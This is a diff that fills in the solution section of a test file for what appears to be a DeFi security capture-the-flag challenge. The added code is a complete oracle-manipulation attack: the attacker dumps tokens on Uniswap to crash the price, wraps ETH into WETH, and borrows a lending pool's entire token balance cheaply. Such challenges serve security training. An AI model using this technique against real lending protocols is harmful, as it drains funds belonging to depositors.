@@ -86,7 +86,29 @@ def test_solve_challenge():
     ##### SOLUTION GOES HERE #####
     ##############################
 
-    # 
+    # approve spending limit at the uniswap router
+    token.approve(uniswap_router.address, 2**256 - 1, _fromAttacker)
+    
+    # exchange the tokens for ETH
+    uniswap_router.swapExactTokensForETH(
+        ether_to_wei(10000), 
+        9.92, 
+        [token.address, weth.address],
+        attacker.address,
+        web3.eth.get_block('latest').timestamp * 2,
+        _fromAttacker)
+    
+    # obtain amount of WETH required to borrow the entire balance
+    amount = lending_pool.calculateDepositOfWETHRequired(POOL_INITIAL_TOKEN_BALANCE)
+
+    # deposit ETH to obtain the required WETH
+    weth.deposit(_fromAttacker | value_dict(amount))
+    
+    # approve the lending pool removing `amount` of tokens from the attacker account 
+    weth.approve(lending_pool.address, amount, _fromAttacker)
+    
+    # borrow the entire token balance
+    lending_pool.borrow(POOL_INITIAL_TOKEN_BALANCE, _fromAttacker)
     
     ######################
     check_solution()
